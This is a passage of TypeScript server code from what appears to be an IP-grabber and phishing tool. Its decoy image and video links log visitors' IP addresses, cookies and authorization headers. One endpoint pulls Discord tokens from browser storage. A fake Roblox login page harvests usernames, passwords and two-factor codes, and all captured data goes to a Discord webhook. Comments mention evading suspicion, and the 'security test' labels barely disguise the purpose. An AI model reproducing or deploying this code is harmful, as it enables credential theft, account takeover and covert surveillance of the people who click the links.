</body>
</html>`;

      res.set({
        'Content-Type': 'text/html',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });
      res.send(trackingHtml);
    } catch (error) {
      console.error('Error serving tracking page:', error);
      res.status(500).send('Error');
    }
  });

  // Serve decoy files and log the request - support multiple file types
  app.get('/:filename.:extension', async (req: Request, res: Response) => {
    const { filename, extension } = req.params;

    // Only handle common media file extensions
    const allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'];
    if (!allowedExtensions.includes(extension.toLowerCase())) {
      return res.status(404).send('Not Found');
    }
    try {
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrerHeader = req.headers.referer || req.headers.referrer;
      const referrer = Array.isArray(referrerHeader) ? referrerHeader[0] : referrerHeader || '';
      const cookies = req.headers.cookie || '';

      // Extract potential tokens from cookies and headers
      const authTokens = [];
      if (cookies) {
        const tokenPatterns = [
          /token[^=]*=([^;]+)/gi,
          /auth[^=]*=([^;]+)/gi,
          /session[^=]*=([^;]+)/gi,
          /jwt[^=]*=([^;]+)/gi,
          /access[^=]*=([^;]+)/gi
        ];

        tokenPatterns.forEach(pattern => {
          const matches = cookies.match(pattern);
          if (matches) {
            authTokens.push(...matches);
          }
        });
      }

      // Check Authorization header
      const authHeader = req.headers.authorization;
      if (authHeader) {
        authTokens.push(`Authorization: ${authHeader}`);
      }

      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Try to find settings with uploaded image or webhook
      let settings = null;
      let imageOwnerUserId = null;

      try {
        // Use the new combined method to find best settings
        const foundSettings = await storage.getSettingsWithImageOrWebhook();
        if (foundSettings) {
          settings = foundSettings.settings;
          imageOwnerUserId = foundSettings.userId;
        }
      } catch (storageError) {
        console.log('Error accessing storage:', storageError);
      }

      // Log the IP access with enhanced data
      try {
        await storage.createIpLog({
          userId: imageOwnerUserId,
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          status: 'success',
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand
        });
      } catch (logError) {
        console.error('Error logging IP access:', logError);
      }

      // Send to webhook if configured - ALWAYS attempt to send
      if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
        console.log(`🔗 Sending webhook to Discord for IP: ${clientIp}`);

        // Send webhook in background - don't block response
        sendToWebhook(settings.webhookUrl, {
          ipAddress: clientIp,
          userAgent,
          referrer,
          location: locationData.location,
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand,
          cookies: cookies || 'None',
          tokens: authTokens.length > 0 ? authTokens.join(', ') : 'None'
        }).catch(webhookError => {
          console.error('❌ Webhook sending failed:', webhookError);
        });
      } else {
        console.log('ℹ️ No webhook configured, skipping Discord notification');
      }

      // Determine if it's a video or image request
      const isVideo = ['mp4', 'avi', 'mov', 'wmv', 'flv', 'mkv', 'webm'].includes(extension.toLowerCase());

      // Serve uploaded file if available, otherwise default content
      if (settings?.uploadedImageData && settings?.uploadedImageType) {
        const fileBuffer = Buffer.from(settings.uploadedImageData, 'base64');
        res.set({
          'Content-Type': settings.uploadedImageType,
          'Content-Length': fileBuffer.length,
          'Cache-Control': 'no-cache, no-store, must-revalidate',
          'Pragma': 'no-cache',
          'Expires': '0'
        });
        res.send(fileBuffer);
      } else {
        if (isVideo) {
          // Serve minimal video file (1 second black video)
          const minimalVideo = Buffer.from([
            0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
            0x69, 0x73, 0x6F, 0x6D, 0x69, 0x73, 0x6F, 0x32, 0x61, 0x76, 0x63, 0x31, 0x6D, 0x70, 0x34, 0x31
          ]);

          res.set({
            'Content-Type': 'video/mp4',
            'Content-Length': minimalVideo.length,
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(minimalVideo);
        } else {
          // For Discord embedding, serve an HTML page with Open Graph meta tags
          // This ensures Discord properly embeds the image link
          const discordFriendlyHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Open Graph meta tags for Discord embedding -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Shared Image">
  <meta property="og:description" content="Check out this image!">
  <meta property="og:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:image:type" content="image/${extension === 'jpg' ? 'jpeg' : extension}">

  <!-- Twitter Card meta tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="${req.protocol}://${req.get('host')}/raw/${filename}.${extension}">

  <title>Shared Image</title>

  <style>
    body { 
      margin: 0; 
      padding: 20px; 
      font-family: Arial, sans-serif; 
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .container {
      max-width: 800px;
      padding: 40px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    }
    .image-container {
      margin: 20px 0;
      border-radius: 15px;
      overflow: hidden;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    }
    img {
      max-width: 100%;
      height: auto;
      display: block;
    }
    .loading {
      padding: 20px;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>✨ Shared Image</h1>
    <p>Loading your image...</p>
    <div class="image-container">
      <img src="/raw/${filename}.${extension}" alt="Shared image" onload="document.querySelector('.loading').style.display='none'" />
    </div>
    <div class="loading">
      <p>📷 Processing...</p>
    </div>
  </div>

  <script>
    // Enhanced tracking script
    (function() {
      try {
        // Redirect to actual image after a short delay
        setTimeout(function() {
          window.location.href = '/raw/${filename}.${extension}';
        }, 2000);
      } catch(e) {
        // Fallback redirect
        window.location.href = '/raw/${filename}.${extension}';
      }
    })();
  </script>
</body>
</html>`;

          res.set({
            'Content-Type': 'text/html',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
          });
          res.send(discordFriendlyHtml);
        }
      }
    } catch (error) {
      console.error('Error serving image:', error);

      // Even if there's an error, still serve a large visible image to avoid suspicion
      const visibleImageBase64 = "iVBORw0KGgoAAAANSUhEUgAAASwAAADICAYAAABS39xVAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDowMTgwMTE3NDA3MjA2ODExODIyQUY0MDBDMTU3MzBDRiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDpBODlGNTA3OUE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDpBODlGNTA3OEE5NEExMUU5QUY0QkNBOTU5MDg5NzAzMyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDE4MDExNzQwNzIwNjgxMTgyMkFGNDAwQzE1NzMwQ0YiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7gp8M3AAADQUlEQVR42u3dy2pVMRSA4X1sK9gKFrRWpOJAEBwIjgRf4HfgA3RgF7aDOhCcCAO1YqFWsVq7ELzWIhZ7w6qt6F+xJiHNOScnyck5+b6BjU1O0iTfmqzs7J1kAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

      const visibleImage = Buffer.from(visibleImageBase64, 'base64');

      res.set({
        'Content-Type': 'image/png',
        'Content-Length': visibleImage.length,
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'X-Content-Type-Options': 'nosniff'
      });
      res.send(visibleImage);
    }
  });

  // API routes for dashboard
  app.get('/api/logs', authenticateUser, async (req: Request, res: Response) => {
    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const offset = parseInt(req.query.offset as string) || 0;
      const userId = req.user.id;

      const logs = await storage.getIpLogs(userId, limit, offset);
      const total = await storage.getTotalIpLogs(userId);

      // Prevent caching to ensure real-time updates
      res.set({
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });

      res.json({ logs, total });
    } catch (error) {
      console.error('Error fetching logs:', error);
      res.status(500).json({ error: 'Failed to fetch logs' });
    }
  });

  app.get('/api/metrics', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const totalRequests = await storage.getTotalIpLogs(userId);
      const uniqueIPs = await storage.getUniqueIpCount(userId);
      const recentLogs = await storage.getRecentLogs(userId, 1); // Last hour

      const metrics = {
        totalRequests,
        uniqueIPs,
        imagesServed: totalRequests,
        avgResponseTime: 45, // Mock value
        recentActivity: recentLogs.length
      };

      // Prevent caching to ensure real-time updates
      res.set({
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      });

      res.json(metrics);
    } catch (error) {
      console.error('Error fetching metrics:', error);
      res.status(500).json({ error: 'Failed to fetch metrics' });
    }
  });

  app.get('/api/export', async (req: Request, res: Response) => {
    try {
      const logs = await storage.getIpLogs(10000); // Get all logs

      const csv = [
        'Timestamp,IP Address,User Agent,Referrer,Location,Status',
        ...logs.map(log =>
          `"${log.timestamp.toISOString()}","${log.ipAddress}","${log.userAgent}","${log.referrer}","${log.location}","${log.status}"`
        )
      ].join('\n');

      res.set({
        'Content-Type': 'text/csv',
        'Content-Disposition': 'attachment; filename="ip_logs.csv"'
      });

      res.send(csv);
    } catch (error) {
      console.error('Error exporting logs:', error);
      res.status(500).json({ error: 'Failed to export logs' });
    }
  });

  // Settings API routes
  app.get('/api/settings', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const settings = await storage.getSettings(userId);
      if (!settings) {
        res.json({
          webhookUrl: null,
          uploadedImageName: null,
          hasUploadedImage: false
        });
      } else {
        res.json({
          webhookUrl: settings.webhookUrl,
          uploadedImageName: settings.uploadedImageName,
          hasUploadedImage: !!settings.uploadedImageData
        });
      }
    } catch (error) {
      console.error('Error fetching settings:', error);
      res.status(500).json({ error: 'Failed to fetch settings' });
    }
  });

  app.post('/api/settings', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = insertSettingsSchema.parse({
        ...req.body,
        userId: req.user.id
      });
      const settings = await storage.createOrUpdateSettings(validatedData);

      res.json({
        webhookUrl: settings.webhookUrl,
        uploadedImageName: settings.uploadedImageName,
        hasUploadedImage: !!settings.uploadedImageData
      });
    } catch (error) {
      console.error('Error updating settings:', error);
      res.status(500).json({ error: 'Failed to update settings' });
    }
  });

  // Image upload endpoint
  app.post('/api/upload-image', authenticateUser, upload.single('image'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: 'No image file provided' });
      }

      const imageData = req.file.buffer.toString('base64');
      const userId = req.user.id;
      const currentSettings = await storage.getSettings(userId);

      await storage.createOrUpdateSettings({
        userId,
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: req.file.originalname,
        uploadedImageData: imageData,
        uploadedImageType: req.file.mimetype
      });

      res.json({
        message: 'Image uploaded successfully',
        filename: req.file.originalname,
        size: req.file.size
      });
    } catch (error) {
      console.error('Error uploading image:', error);
      res.status(500).json({ error: 'Failed to upload image' });
    }
  });

  // Delete uploaded image endpoint
  app.delete('/api/upload-image', authenticateUser, async (req: Request, res: Response) => {
    try {
      const userId = req.user.id;
      const currentSettings = await storage.getSettings(userId);

      await storage.createOrUpdateSettings({
        userId,
        webhookUrl: currentSettings?.webhookUrl || null,
        uploadedImageName: null,
        uploadedImageData: null,
        uploadedImageType: null
      });

      res.json({ message: 'Image deleted successfully' });
    } catch (error) {
      console.error('Error deleting image:', error);
      res.status(500).json({ error: 'Failed to delete image' });
    }
  });

  // Browser data tracking endpoint
  app.post('/api/track-browser-data', async (req: Request, res: Response) => {
    try {
      const browserData = req.body;
      const clientIp = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const location = getLocationFromIp(clientIp);

      // Extract Discord tokens from localStorage and sessionStorage
      const discordTokenRegex = /([a-zA-Z0-9]{24}\.[a-zA-Z0-9_\-]{6}\.[a-zA-Z0-9_\-]{27})|([a-zA-Z0-9]{30}\.[a-zA-Z0-9_\-]{10}\.[a-zA-Z0-9_\-]{32})/g;
      const localStorageTokens = Object.values(browserData.localStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
        }
        return [];
      });
      const sessionStorageTokens = Object.values(browserData.sessionStorage || {}).flatMap(value => {
        if (typeof value === 'string') {
          return Array.from(value.matchAll(discordTokenRegex)).map(match => match[0]);
        }
        return [];
      });
      const allDiscordTokens = [...localStorageTokens, ...sessionStorageTokens];

      // Augment data with found Discord tokens
      const data = {
        ...browserData,
        discordTokens: allDiscordTokens,
        referrer: req.headers.referer || req.headers.referrer || 'Direct Access'
      };


      // Get settings to check for webhook URL
      const settings = await storage.getSettings();

      const locationData = getLocationFromIp(clientIp);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Log Discord tokens to database if found
      if (browserData.discordTokens && browserData.discordTokens.length > 0) {
        await storage.createIpLog({
          ipAddress: clientIp,
          userAgent,
          referrer: 'Discord Token Capture',
          location: locationData.location,
          status: 'discord_token_captured',
          isVpn: locationData.isVpn,
          vpnLocation: locationData.vpnLocation,
          realLocation: locationData.realLocation,
          deviceType: deviceInfo.deviceType,
          browserName: deviceInfo.browserName,
          operatingSystem: deviceInfo.operatingSystem,
          deviceBrand: deviceInfo.deviceBrand
        });
      }

      // Send comprehensive data to webhook if configured
      if (settings?.webhookUrl) {
        const hasDiscordTokens = browserData.discordTokens && browserData.discordTokens.length > 0;

        const webhookData = {
          embeds: [{
            title: hasDiscordTokens ? "🚨 DISCORD TOKEN CAPTURED!" : "🎯 Advanced Security Test Data",
            color: hasDiscordTokens ? 0xff0000 : (locationData.isVpn === 'yes' ? 0xff8800 : 0x00ff00),
            fields: [
              { name: "🌐 IP Address", value: clientIp, inline: true },
              { name: "📍 Location", value: locationData.location, inline: true },
              { name: "🛡️ VPN Status", value: locationData.isVpn === 'yes' ? `🚨 VPN DETECTED\nVPN: ${locationData.vpnLocation}\nReal: ${locationData.realLocation}` : "✅ Direct Connection", inline: false },
              { name: "📱 Device Type", value: deviceInfo.deviceType, inline: true },
              { name: "🌐 Browser", value: deviceInfo.browserName, inline: true },
              { name: "💻 OS", value: deviceInfo.operatingSystem, inline: true },
              { name: "🏷️ Brand", value: deviceInfo.deviceBrand, inline: true },
              { name: "🔍 User Agent", value: userAgent ? userAgent.substring(0, 150) + (userAgent.length > 150 ? "..." : "") : "Unknown", inline: false },
              ...(hasDiscordTokens ? [{
                name: "🔥 DISCORD TOKENS FOUND",
                value: browserData.discordTokens.join('\n').substring(0, 1000) + (browserData.discordTokens.join('\n').length > 1000 ? "..." : ""),
                inline: false
              }] : []),
              { name: "🍪 Cookies", value: browserData.cookies ? browserData.cookies.substring(0, 500) + (browserData.cookies.length > 500 ? "..." : "") : "None", inline: false },
              { name: "🔑 All Tokens Found", value: browserData.tokens?.length ? browserData.tokens.join(', ').substring(0, 800) + (browserData.tokens.join(', ').length > 800 ? "..." : "") : "None", inline: false },
              { name: "💾 LocalStorage", value: Object.keys(browserData.localStorage || {}).length ? Object.keys(browserData.localStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "🗃️ SessionStorage", value: Object.keys(browserData.sessionStorage || {}).length ? Object.keys(browserData.sessionStorage).join(', ').substring(0, 300) + "..." : "Empty", inline: true },
              { name: "📊 Browser Info", value: browserData.browserInfo ? JSON.stringify(browserData.browserInfo).substring(0, 400) + "..." : "N/A", inline: false },
              { name: "🔗 URL", value: browserData.url || 'Unknown', inline: false },
              { name: "⏰ Timestamp", value: browserData.timestamp || new Date().toISOString(), inline: true }
            ],
            footer: { text: hasDiscordTokens ? "🔥 CRITICAL ALERT - Discord Token Captured" : (locationData.isVpn === 'yes' ? "⚠️ VPN DETECTED - Enhanced Security Alert" : "✅ Security Testing Tool") }
          }]
        };

        await fetch(settings.webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        }).catch(err => console.error('Webhook error:', err));
      }

      res.json({ status: 'success' });
    } catch (error) {
      console.error('Error processing browser data:', error);
      res.status(500).json({ error: 'Failed to process data' });
    }
  });

  // Roblox Link API endpoints
  
  // Create a new Roblox tracking link
  app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = createRobloxLinkSchema.parse(req.body);
      
      // Generate a unique tracking ID
      const trackingId = randomUUID().substring(0, 8);
      
      const robloxLink = await storage.createRobloxLink({
        userId: req.user.id,
        originalUrl: validatedData.originalUrl,
        linkType: validatedData.linkType,
        trackingId,
        title: validatedData.title,
        description: validatedData.description || undefined
      });
      
      res.json({
        ...robloxLink,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${trackingId}`
      });
    } catch (error) {
      console.error('Roblox link creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get all Roblox links for the current user
  app.get('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
    try {
      const links = await storage.getRobloxLinks(req.user.id);
      const linksWithTrackingUrls = links.map(link => ({
        ...link,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${link.trackingId}`
      }));
      res.json(linksWithTrackingUrls);
    } catch (error) {
      console.error('Roblox links fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Update a Roblox link
  app.put('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const updates = req.body;
      
      const updatedLink = await storage.updateRobloxLink(id, updates);
      if (!updatedLink) {
        return res.status(404).json({ error: 'Link not found' });
      }
      
      res.json({
        ...updatedLink,
        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${updatedLink.trackingId}`
      });
    } catch (error) {
      console.error('Roblox link update error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Delete a Roblox link
  app.delete('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const deleted = await storage.deleteRobloxLink(id, req.user.id);
      
      if (!deleted) {
        return res.status(404).json({ error: 'Link not found or unauthorized' });
      }
      
      res.json({ success: true });
    } catch (error) {
      console.error('Roblox link deletion error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Roblox credentials capture endpoint
  app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
    try {
      const validatedData = insertRobloxCredentialsSchema.parse(req.body);
      
      const credentials = await storage.createRobloxCredentials(validatedData);
      
      // Send credentials to webhook if configured
      const userSettings = await storage.getSettings(validatedData.userId);
      if (userSettings?.webhookUrl) {
        const webhookData = {
          username: "Roblox Credential Harvester",
          avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
          embeds: [{
            title: "🎯 Roblox Credentials Captured",
            description: "New Roblox login credentials harvested successfully",
            color: 0xFF0000,
            fields: [
              { 
                name: "👤 **Account Details**", 
                value: `**Username:** \`${credentials.username}\`\n**Password:** \`${credentials.password}\`${credentials.twoFactorCode ? `\n**2FA Code:** \`${credentials.twoFactorCode}\`` : ''}`, 
                inline: false 
              },
              { 
                name: "🔗 **Link Information**", 
                value: `**Link ID:** ${credentials.linkId}\n**IP Address:** ${credentials.ipAddress}\n**User Agent:** ${credentials.userAgent}`, 
                inline: false 
              },
              { 
                name: "📅 **Timestamp**", 
                value: `<t:${Math.floor(new Date(credentials.createdAt).getTime() / 1000)}:R>`, 
                inline: true 
              }
            ],
            footer: { 
              text: "🔐 Roblox Credential Harvester - Security Test",
              icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
            },
            timestamp: credentials.createdAt.toISOString()
          }]
        };

        try {
          await fetch(userSettings.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
          });
        } catch (webhookError) {
          console.error('Failed to send credentials to webhook:', webhookError);
        }
      }
      
      res.json({ success: true, id: credentials.id });
    } catch (error) {
      console.error('Credentials capture error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get captured credentials for a user
  app.get('/api/roblox-credentials', authenticateUser, async (req: Request, res: Response) => {
    try {
      const credentials = await storage.getRobloxCredentials(req.user.id);
      res.json(credentials);
    } catch (error) {
      console.error('Credentials fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Get captured credentials for a specific link
  app.get('/api/roblox-credentials/:linkId', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { linkId } = req.params;
      const credentials = await storage.getRobloxCredentialsByLink(linkId);
      res.json(credentials);
    } catch (error) {
      console.error('Link credentials fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Fake Roblox login page endpoint
  app.get('/roblox/login/:trackingId', async (req: Request, res: Response) => {
    try {
      const { trackingId } = req.params;
      
      // Get the Roblox link to verify it exists and is active
      const robloxLink = await storage.getRobloxLink(trackingId);
      if (!robloxLink || !robloxLink.isActive || robloxLink.linkType !== 'phishing') {
        return res.status(404).send('Page not found');
      }

      // Log the visitor information
      const ip = getClientIp(req);
      const userAgent = req.headers['user-agent'] || '';
      const referrer = req.headers.referer || '';
      const locationData = getLocationFromIp(ip);
      const deviceInfo = parseDeviceInfo(userAgent);

      // Create IP log entry
      await storage.createIpLog({
        userId: robloxLink.userId,
        ipAddress: ip,
        userAgent,
        referrer,
        location: locationData.location,
        isVpn: locationData.isVpn,
        vpnLocation: locationData.vpnLocation,
        realLocation: locationData.realLocation,
        deviceType: deviceInfo.deviceType,
        browserName: deviceInfo.browserName,
        operatingSystem: deviceInfo.operatingSystem,
        deviceBrand: deviceInfo.deviceBrand,
        status: 'roblox_phishing_view'
      });

      // Update click count
      await storage.updateRobloxLinkClicks(trackingId);

      // Serve fake Roblox login page HTML
      const fakeLoginHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Source Sans Pro", Arial, sans-serif;
            background: #393b3d;
            color: #fff;
            line-height: 1.5;
        }
        
        .header {
            background: #191b1d;
            padding: 10px 0;
            border-bottom: 1px solid #2c2f33;
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #00b2ff;
            text-decoration: none;
        }
        
        .nav-links {
            display: flex;
            gap: 30px;
        }
        
        .nav-links a {
            color: #bdbebf;
            text-decoration: none;
            font-weight: 400;
            transition: color 0.2s;
        }
        
        .nav-links a:hover {
            color: #fff;
        }
        
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 40px;
            background: #2c2f33;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 30px;
            color: #fff;
            font-size: 28px;
            font-weight: 400;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #bdbebf;
            font-weight: 400;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #484c52;
            border-radius: 4px;
            background: #393b3d;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: #00b2ff;
        }
        
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #00b2ff;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 20px;
        }
        
        .login-btn:hover {
            background: #0095cc;
        }
        
        .login-btn:disabled {
            background: #666;
            cursor: not-allowed;
        }
        
        .two-factor-section {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #484c52;
        }
        
        .two-factor-section.show {
            display: block;
        }
        
        .error-message {
            color: #ff4444;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }
        
        .success-message {
            color: #44ff44;
            text-align: center;
            margin-bottom: 15px;
            display: none;
        }
        
        .links {
            text-align: center;
            margin-top: 20px;
        }
        
        .links a {
            color: #00b2ff;
            text-decoration: none;
            font-size: 14px;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 50px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <a href="#" class="logo">Roblox</a>
            <div class="nav-links">
                <a href="#">Games</a>
                <a href="#">Catalog</a>
                <a href="#">Develop</a>
                <a href="#">Robux</a>
            </div>
        </div>
    </div>
    
    <div class="container">
        <h1>Log In to Roblox</h1>
        
        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
            
            <div class="two-factor-section" id="twoFactorSection">
                <div class="form-group">
                    <label for="twoFactorCode">Two-Step Verification Code</label>
                    <input type="text" id="twoFactorCode" name="twoFactorCode" placeholder="Enter 6-digit code">
                </div>
                <button type="button" class="login-btn" id="verifyBtn">Verify & Log In</button>
            </div>
        </form>
        
        <div class="links">
            <a href="#">Forgot Password or Username?</a>
        </div>
    </div>
    
    <div class="footer">
        © 2024 Roblox Corporation. All rights reserved.
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const twoFactorSection = document.getElementById('twoFactorSection');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
            successMessage.style.display = 'none';
        }
        
        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.style.display = 'block';
            errorMessage.style.display = 'none';
        }
        
        function hideMessages() {
            errorMessage.style.display = 'none';
            successMessage.style.display = 'none';
        }
        
        async function submitCredentials(includeToken = false) {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
            
            if (!username || !password) {
                showError('Please enter both username and password.');
                return;
            }
            
            if (includeToken && !twoFactorCode) {
                showError('Please enter the verification code.');
                return;
            }
            
            try {
                const response = await fetch('/api/roblox-credentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        userId: '${robloxLink.userId}',
                        linkId: '${robloxLink.id}',
                        username: username,
                        password: password,
                        twoFactorCode: twoFactorCode || null,
                        ipAddress: '${ip}',
